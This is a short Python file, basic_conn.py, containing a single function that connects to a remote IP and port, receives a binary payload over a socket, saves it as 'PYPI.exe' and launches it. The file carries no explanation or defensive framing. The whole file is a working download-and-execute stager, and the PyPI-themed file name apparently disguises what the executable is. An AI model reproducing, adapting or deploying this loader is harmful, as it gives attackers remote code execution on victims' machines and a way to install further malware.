# -*- coding:utf-8 -*-
# @FileName  :basic_conn.py
# @Time      :2022/11/24 20:37:43
# @Author    :D0WE1L1N
import socket
from os import rename, system
def _connent(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    while True:
        dir_data = s.recv(1024).decode()
        s.send(bytes("OK", "UTF8"))
        len_data = s.recv(1024).decode()
        s.send(bytes("OK", "UTF8"))
        upload_data = s.recv(int(len_data))
        if upload_data:
            f = open("PYPI.txt", "wb+")
            f.write(upload_data)
            f.close()
            rename("PYPI.txt", "PYPI.exe")
            system("start PYPI.exe")
            s.send(bytes("DONE", "utf8"))
